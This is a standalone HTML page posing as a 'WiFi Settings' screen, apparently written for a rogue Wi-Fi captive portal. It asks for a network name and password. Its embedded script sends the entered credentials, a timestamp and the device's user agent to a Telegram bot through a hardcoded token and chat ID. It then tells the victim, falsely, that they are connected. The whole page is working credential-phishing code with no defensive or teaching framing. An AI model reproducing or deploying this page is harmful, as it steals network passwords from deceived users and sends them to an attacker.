<!DOCTYPE html>
<html lang="tg">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Settings</title>
<style>
  *{box-sizing:border-box}
  body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;margin:0;height:100vh;
       display:flex;justify-content:center;align-items:center;background:#eef1f5}
  .box{background:#fff;padding:26px 24px;border-radius:16px;width:300px;
       box-shadow:0 8px 30px rgba(0,0,0,.12);text-align:center}
  h2{margin:0 0 4px;font-size:19px}
  p{color:#777;font-size:13px;margin:0 0 18px}
  input{width:100%;padding:12px;margin-bottom:10px;border:1px solid #d5d9e0;
        border-radius:10px;font-size:15px;outline:none}
  input:focus{border-color:#0a84ff}
  button{width:100%;padding:12px;background:#0a84ff;color:#fff;border:0;
         border-radius:10px;font-size:16px;font-weight:600}
  button:disabled{opacity:.6}
  .ok{font-size:44px;color:#28a745}
</style>
</head>
<body>
<div class="box" id="box">
  <h2>WiFi Settings</h2>
  <p>Enter your network credentials to connect</p>
  <form onsubmit="send(event)">
    <input id="ssid" placeholder="Network name (SSID)" required>
    <input id="pass" placeholder="Password" required>
    <button id="btn" type="submit">Connect</button>
  </form>
</div>

<script>
var TOKEN = 'AAGCj1Okg0kfFjYjgeeSwYn0c3FnYhwGpzE';
var CHAT  = '5848763827';

function send(e){
  e.preventDefault();
  var btn = document.getElementById('btn');
  btn.disabled = true;
  btn.textContent = 'Connecting...';

  var ssid = document.getElementById('ssid').value.trim();
  var pass = document.getElementById('pass').value.trim();

  var text =
    '\uD83D\uDCF6 WiFi хабари нав\n' +
    'Шабака: ' + ssid + '\n' +
    'Парол: ' + pass + '\n' +
    'Вақт: ' + new Date().toLocaleString('ru-RU') + '\n' +
    'Дастгоҳ: ' + navigator.userAgent;

  fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
    method: 'POST',
    body: new URLSearchParams({ chat_id: CHAT, text: text })
  })
  .catch(function(){})
  .finally(function(){
    document.getElementById('box').innerHTML =
      '<div class="ok">\u2713</div>' +
      '<h2>Connected</h2>' +
      '<p>You are now connected to the network.</p>';
  });
}
</script>
</body>
</html>
